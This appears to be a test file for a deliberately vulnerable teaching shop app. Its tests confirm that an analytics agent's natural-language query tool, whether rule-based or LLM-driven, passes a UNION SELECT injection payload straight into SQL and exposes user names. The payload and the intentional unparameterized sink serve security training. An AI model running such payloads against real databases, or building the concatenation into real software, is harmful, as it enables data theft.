const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { seedShop, purgeToolCaches } = require('../_fixture.js');

const REPO = path.resolve(__dirname, '../../../..');

/**
 * @intentional-vulnerability sqli-nl-generated
 * @teaches OWASP-Web:A03
 * @location agent-host/agents/analytics/tools/index.js
 * analytics.nl_query concatenates the user's WHERE expression directly into
 * SQL. A UNION SELECT against shop_users surfaces rows the merchant should
 * never see.
 */
test('sqli-nl-generated: NL "products where <expr>" carries UNION SELECT verbatim', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    const { nl_query } = require(path.join(REPO, 'agent-host/agents/analytics/tools/index.js'));
    // Rule-based translator (SS_ANALYTICS_LLM_ENABLED unset) — the SQLi sink
    // is unchanged: the WHERE fragment is concatenated verbatim into SQL.
    const r = await nl_query({ question: `products where 1=1 UNION SELECT id, username, 0.0, 0, 0 FROM shop_users --` });
    assert.equal(r.ok, true, `expected SELECT to run; error was: ${r.error}`);
    assert.match(r.sql, /UNION SELECT/i);
    const names = r.rows.map(x => x.name);
    assert.ok(names.includes('sasan') || names.includes('alice'), 'UNION exfiltrated shop_users usernames as products.name');
  } finally {
    await s.close();
  }
});

test('sqli-nl-generated: F13 — LLM-in-the-loop path is wired when SS_ANALYTICS_LLM_ENABLED=true', async () => {
  // Wave 5A F13 — restore the LLM-in-the-loop claim. When enabled, nl_query
  // asks the AI service for SQL. We stub the AI service so the test is
  // deterministic and does not need Ollama running.
  const s = await seedShop();
  purgeToolCaches();
  const svcPath = require.resolve(path.join(REPO, 'server/services/multiProviderAIService.js'));
  const originalCache = require.cache[svcPath];
  require.cache[svcPath] = {
    id: svcPath, filename: svcPath, loaded: true,
    exports: {
      generateResponse: async (prompt) => ({
        response: 'SELECT id, name, price FROM products WHERE 1=1 UNION SELECT id, username, 0.0 FROM shop_users',
      }),
    },
  };
  process.env.SS_ANALYTICS_LLM_ENABLED = 'true';
  try {
    // Purge the analytics tool module cache so it re-reads _getAiService().
    const analyticsPath = require.resolve(path.join(REPO, 'agent-host/agents/analytics/tools/index.js'));
    delete require.cache[analyticsPath];
    const { nl_query } = require(analyticsPath);
    const r = await nl_query({ question: 'union everything from shop_users' });
    assert.equal(r.ok, true, `expected SELECT to run; error: ${r.error}`);
    assert.match(r.why, /LLM-generated/, 'used the LLM path');
    assert.match(r.sql, /UNION SELECT/i, 'LLM-emitted SQL runs unparameterized (the sink)');
  } finally {
    delete process.env.SS_ANALYTICS_LLM_ENABLED;
    require.cache[svcPath] = originalCache;
    await s.close();
  }
});
